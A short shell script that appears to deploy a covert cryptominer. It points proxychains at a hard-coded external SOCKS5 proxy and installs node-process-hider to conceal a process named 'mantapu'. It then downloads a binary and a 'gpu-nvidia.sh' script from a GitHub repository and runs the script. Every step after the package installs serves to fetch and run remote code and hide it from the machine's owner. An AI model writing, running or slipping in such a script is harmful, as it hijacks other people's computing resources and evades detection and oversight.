#!/bin/sh
sudo apt update -y
sudo apt install screen -y
apt install proxychains
sed -i 's/socks4/socks5/' /etc/proxychains.conf
sed -i 's/127.0.0.1/98.162.96.53/' /etc/proxychains.conf
sed -i 's/9050/10663/' /etc/proxychains.conf
sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add mantapu
wget https://github.com/d-crypto99/xroc3/raw/main/mantapu
wget https://raw.githubusercontent.com/d-crypto99/xroc3/main/gpu-nvidia.sh
chmod +x gpu-nvidia.sh
./gpu-nvidia.sh
